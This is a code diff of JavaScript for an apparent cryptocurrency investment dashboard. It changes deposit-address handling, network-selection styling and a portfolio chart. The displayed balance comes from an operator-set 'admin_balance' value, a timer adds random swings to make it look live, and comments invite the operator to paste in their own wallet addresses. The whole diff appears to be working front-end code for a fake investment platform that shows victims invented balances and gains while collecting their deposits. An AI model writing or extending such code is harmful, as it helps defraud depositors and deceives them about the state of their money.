@@ -1,12 +1,11 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // --- VALUE DEFINITIONS ---
     let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
     
-    // Customize your three target addresses right here!
-    let targetWallets = {
+    // Add your addresses inside these quotes
+    let walletAddresses = {
         'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
-        'Bitcoin (BTC Mainnet)': "1BitcoinTestAddressGoesHere111111",
-        'Ethereum (ETH ERC20)': "0xEthTestAddressGoesHere2222222222"
+        'Bitcoin (BTC Mainnet)': "1BitcoinWalletAddressGoesHere",
+        'Ethereum (ETH ERC20)': "0xEthereumWalletAddressGoesHere"
     };
 
     function updateBalanceDisplay() {
@@ -17,7 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     updateBalanceDisplay();
 
-    // --- MODAL CLICK HANDLERS ---
+    // --- BUTTON MODAL TRIGGERS ---
     window.triggerDepositModal = function() {
         const modal = document.getElementById('depositModal');
         if (modal) modal.style.display = 'flex';
@@ -38,15 +37,39 @@ document.addEventListener('DOMContentLoaded', () => {
         if (modal) modal.style.display = 'none';
     };
 
-    // --- INTERACTIVE SWAP SYSTEM FOR COINS ---
-    window.switchCryptoNetwork = function(selectedNetwork) {
+    // --- COIN SWAPPING ENGINE ---
+    window.switchCryptoNetwork = function(networkName) {
         const addressBox = document.getElementById('walletAddressBox');
-        if (addressBox && targetWallets[selectedNetwork]) {
-            addressBox.innerText = targetWallets[selectedNetwork];
+        if (addressBox && walletAddresses[networkName]) {
+            addressBox.innerText = walletAddresses[networkName];
         }
+
+        const networks = [
+            { id: 'coin-usdt', textId: null, checkId: 'check-usdt', name: 'USDT (TRC20)' },
+            { id: 'coin-btc', textId: 'text-btc', checkId: 'check-btc', name: 'Bitcoin (BTC Mainnet)' },
+            { id: 'coin-eth', textId: 'text-eth', checkId: 'check-eth', name: 'Ethereum (ETH ERC20)' }
+        ];
+
+        networks.forEach(item => {
+            const panel = document.getElementById(item.id);
+            const check = document.getElementById(item.checkId);
+            const textSpan = item.textId ? document.getElementById(item.textId) : null;
+            
+            if (panel && check) {
+                if (item.name === networkName) {
+                    panel.style.border = '2px solid #10b981';
+                    check.style.display = 'block';
+                    if (textSpan) textSpan.style.color = '#10b981';
+                } else {
+                    panel.style.border = '1px solid #334155';
+                    check.style.display = 'none';
+                    if (textSpan) textSpan.style.color = '#94a3b8';
+                }
+            }
+        });
     };
 
-    // --- LINE CHART ARCHITECTURE ---
+    // --- PORTFOLIO CHART GENERATOR ---
     const chartElement = document.getElementById('LivePerformanceChart');
     if (!chartElement) return;
     const ctx = chartElement.getContext('2d');
@@ -84,7 +107,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // --- TIMED LIVE REFRESH SYNC ---
+    // --- BACKGROUND AUTOMATION REFRESH ---
     setInterval(() => {
         const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
         const pctChange = (Math.random() * 0.3 - 0.15) / 100;
